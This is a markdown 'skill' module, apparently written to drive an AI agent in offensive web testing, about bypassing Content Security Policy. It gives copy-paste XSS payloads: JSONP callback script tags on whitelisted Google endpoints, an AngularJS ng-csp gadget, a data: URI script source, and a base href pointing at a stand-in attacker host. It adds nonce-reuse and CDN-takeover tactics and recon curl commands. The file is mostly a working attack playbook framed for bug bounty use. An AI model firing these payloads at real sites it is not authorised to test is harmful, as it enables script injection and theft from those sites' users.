# SKILL: Content Security Policy (CSP) Bypass

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (content security policy (csp) bypass) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Strict CSP feels invincible until you find a JSONP endpoint, Angular gadget, or trusted CDN exposing a script that takes user-controlled args.

---

## DETECTION
Read CSP header. List directives. Find weak host whitelists.

## EXPLOITATION
### unsafe-inline / unsafe-eval present
Game over. Your XSS just runs.

### JSONP gadget on whitelisted domain
```html
<script src=https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)></script>
<script src=https://www.google.com/jsapi?callback=alert(1)></script>
```

### AngularJS gadget (when ng* runtime allowed)
```html
<div ng-app ng-csp><div ng-click=$event.view.alert(document.domain)>x</div></div>
```

### data: scheme allowed in script-src
```html
<script src="data:,alert(document.domain)"></script>
```

### Object / base / form action tricks
- `<base href=//attacker.tld>` redirects all relative resources.
- `<object data=...>` if `object-src 'self'` lax.

### Nonce reuse
If app reflects `nonce` from URL into CSP nonce attribute → clone nonce into your script tag.

### Trusted CDN takeover
- `script-src 'self' https://cdn.example.com` — find unclaimed S3 / Cloudfront under `cdn.example.com`.

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
Look for: jsonp, angular, vue, reactjs runtime, nonce reflection, base href, dangling cdn, expression-evaluators.

## CHAIN POTENTIAL
CSP bypass + reflected XSS = full XSS exploitation.

## TOOLS
csp-evaluator (Google), `csptester`, manual

## COMMANDS
```bash
curl -sI https://target | grep -i content-security-policy
csp-evaluator-cli https://target
```

## EDGE CASES / NOT-A-BUG TRAPS
Strict-Dynamic CSP closes most JSONP gadgets but still bypassable via DOM-clobbered nonce.

## TRIAGE ANGLE (per platform)
Show running XSS while CSP header present.

## SEVERITY & CVSS
+1.0–2.0 over base XSS severity.

## REFERENCES
csp-evaluator.withgoogle.com • PortSwigger CSP
